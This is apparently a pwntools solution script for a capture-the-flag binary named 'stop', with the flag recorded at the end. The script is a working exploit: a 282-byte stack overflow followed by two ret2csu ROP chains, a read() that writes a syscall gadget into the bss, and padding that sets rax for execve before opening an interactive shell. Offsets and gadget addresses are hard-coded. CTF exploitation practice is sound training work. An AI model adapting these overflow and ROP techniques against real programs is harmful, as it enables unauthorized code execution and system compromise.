from pwn import *

r = process('./stop')

offset = 282

shell_addr = 0x400a1a
syscall = 0x4008e5
pop_rdi = 0x400953
pop_rsi_r15 = 0x400951

# First chain - will setup syscall for read - to set syscall on bss and rax for execve
payload = ""
payload += "A"*offset
payload += p64(0x40094b) # pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload += p64(1)
payload += p64(0x601db8)
payload += p64(0)
payload += p64(0)
payload += p64(100) # rdx value
payload += p64(0x0000000000400930) #ret2csu 0x0000000000400930
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(0x602000)
payload += p64(0)
payload += p64(0x4008e0) # read()

# Second chain - Will setup rdi rsi rdx for execve
payload += p64(0x40094b) # pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload += p64(1) # rbp for jne
payload += p64(0x602000) # bss
payload += p64(shell_addr) # rdi
payload += p64(0)
payload += p64(0) # rdx value
payload += p64(0x0000000000400930) #ret2csu 0x0000000000400930

r.recvuntil('letter?')
#r.sendline('a')
#r.recvuntil('Category?')
r.sendline(payload)
r.recvuntil('yet')
r.sendline(p64(syscall) + "A"*50) # write syscall to bss and add padding to make rax 0x3b
r.interactive()

# flag: tjctf{st0p_th4t_r1ght_now}
